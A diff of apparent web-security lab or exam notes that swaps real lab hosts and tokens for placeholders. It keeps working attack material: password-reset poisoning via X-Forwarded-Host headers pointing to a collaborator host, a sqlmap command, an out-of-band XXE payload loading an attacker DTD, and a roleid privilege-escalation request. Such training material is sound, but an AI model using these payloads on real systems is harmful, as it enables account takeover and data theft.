@@ -15,7 +15,7 @@ X-Forwarded-For: EXPLOIT.com
 >log  
 
 ```
-/forgot_password?temp-forgot-password-token=y0x5HxxbQGl6EGL5L11e8jrvRqjO4qQ5
+/forgot_password?temp-forgot-password-token=YESYESYESYESYES
 ```
 
 ## 1 - 2  
@@ -75,7 +75,7 @@ sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journal
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 
-<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://exploit-0aaa001b0439377fc0746bbe014200d6.web-security-academy.net/exploit.dtd"> %xxe;]>
+<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://exploit.net/exploit.dtd"> %xxe;]>
 <users>
     <user>
         <username>3421xxe3421</username>
@@ -91,15 +91,15 @@ sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journal
 >Forgot password?  
 
 ```
-X-Forwarded-Host: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
-X-Host: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
-X-Forwarded-Server: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
+X-Forwarded-Host: COLLABORATOR.com
+X-Host: COLLABORATOR.com
+X-Forwarded-Server: COLLABORATOR.com
 ```  
 
 >EXPLOIt SERVER LOGS  
 
 ```
-/new_password?temp-forgot-password-token=DZX6O8ra9emPGW8pet9msLaJSceXinFt
+/new_password?temp-forgot-password-token=YESYESYESYESYESYESYESYESYEYS
 ```
 
 
@@ -113,8 +113,8 @@ X-Forwarded-Server: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
 
 ```
 {
-	"csrf":"LfjLSEtL7kWqaJN6nYJ14GStmeMQUz3T",
-	"email":"Carlos@app2.test7",
+	"csrf":"YESYESYESYESYESYESYESYESYEYS",
+	"email":"Carlos@EXAM.test",
 	"roleid": 42
 }
 ```  
